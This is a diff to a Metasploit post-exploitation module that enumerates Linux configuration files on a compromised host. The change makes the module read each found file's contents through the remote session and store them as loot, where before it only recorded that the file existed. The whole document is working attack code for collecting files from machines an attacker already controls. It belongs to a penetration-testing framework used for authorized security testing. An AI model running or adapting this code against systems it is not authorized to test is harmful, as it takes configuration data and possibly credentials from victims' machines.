@@ -48,6 +48,12 @@ class Metasploit3 < Msf::Post
 		find_configs
 	end
 
+	def save(msg, data, ctype="text/plain")
+		ltype = "linux.enum.conf"
+		loot = store_loot(ltype, ctype, session, data, nil, msg)
+		print_status("#{msg} stored in #{loot.to_s}")
+	end
+
 	def get_host
 		case session.type
 		when /meterpreter/
@@ -57,6 +63,12 @@ class Metasploit3 < Msf::Post
 		end
 
 		return host
+	end
+
+	def cat_file(filename)
+		vprint_status("Download: #{filename}")
+		output = read_file(filename)
+		return output
 	end
 
 	def find_configs
@@ -70,17 +82,9 @@ class Metasploit3 < Msf::Post
 
 		configs.each do |f|
 			if ::File.exist?("#{f}") == true
-				print_good("Found: #{f}")
-				output = ("Config: #{f}")
-
-				report_note(
-					:host_name => get_host,
-					:type      => "config files",
-					:data      => output,
-					:update    => :unique_data
-				)
+				output = cat_file("#{f}")
+				save("Found #{f} \nStoring as: ",  output)
 			end
 		end
-		print_status("Found configurations saved in notes.")
 	end
 end
